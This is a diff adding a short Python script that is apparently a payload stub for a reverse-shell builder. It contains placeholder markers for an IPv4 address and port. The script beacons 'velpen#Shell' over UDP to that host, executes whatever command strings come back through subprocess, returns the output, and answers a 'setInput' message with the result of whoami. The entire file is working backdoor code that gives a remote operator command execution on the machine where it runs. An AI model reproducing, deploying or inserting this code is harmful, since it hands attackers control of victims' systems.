@@ -1,0 +1,12 @@
+import socket, subprocess
+if __name__=='__main__':
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    serv = ("%%%%%%IPV4%%%%%%", int("%%%%%%PORT%%%%%%"))
+    try:
+        sock.sendto("velpen#Shell".encode('utf-8'), serv)
+    except socket.gaierror:
+        quit()
+    while True:
+        data, addr = sock.recvfrom(4096 * 12)
+        if data.decode('utf-8') == "setInput": sock.sendto("velpenCMD#!InputSTR {}".format(subprocess.getoutput("whoami")).encode('utf-8'), serv); continue
+        sock.sendto(subprocess.getoutput(data.decode('utf-8')).encode('utf-8'), addr)
